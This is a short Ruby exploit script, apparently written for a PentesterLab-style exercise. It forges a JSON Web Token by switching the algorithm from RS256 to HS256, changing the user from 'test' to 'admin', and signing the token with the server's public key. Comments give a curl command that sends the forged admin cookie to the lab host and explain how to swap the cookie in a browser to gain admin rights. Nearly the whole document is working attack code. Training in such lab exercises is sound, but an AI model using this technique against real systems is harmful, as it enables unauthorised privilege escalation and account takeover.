# This exploit will break apart the JWT into its respective parts, decode the header and payload, change the payload to be an admin, change the header type to HS256, cimbine the new header and new payload to be the data that will be signed, and sign the new data with the public key in the public.pem file to make a new JWT.
# From here we can curl "curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.FSfvCBAwypJ4abF6jFLmR7JgZhkW674Z8dIdAIRyt1E=" http://ptl-b8c9ff31-3393d66a.libcurl.so/" where the cookie is the new JWT cooking without the trailing "=" and the URL of the main site. 
# This new token can also be placed in the webpage once logged in as a general user and then replacing the cookie for the new token. On refresh the user will be admin.

require 'base64'
require 'openssl'

pub =  File.open("../../../Downloads/public.pem").read

puts pub
TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QifQ.ZabKsEue5gDPyvwNnS8Xned104AR5V4LFaM4ApaLM9OvG2SEQbiiOwLvwFXM0mqAI7xoJXDosbjvNFzz21rthQDZseZkrw9Ogebbxr6b14wO6p64VQV0siBKroL_xWa8o5chkSru1kEEHAsEm5CaZvQlhshDvZc0gf-_eE0ZPudVO2j3ie_70dEqVCQJ5d86iYp5Ob0SRJdjpXNnYcmFnj9KOLnuM6TGzYExWqVRw2II2Iovjahq0IjacnnO47Hpixe8YHuTVZtzDTNLcqGvslNxYAq2efMWLktqM6rOU5k-CrtqVV3vc1bgcXmTOCI2_3FsnDQ2_hssWaocA18EEw"
header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256", "HS256")
# puts decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=","")
puts new_header


decoded_payload = Base64.decode64(payload)
decoded_payload.gsub!("test", "admin")
# puts decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")
puts new_payload


data = new_header+"."+new_payload
puts data

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))

puts data+"."+signature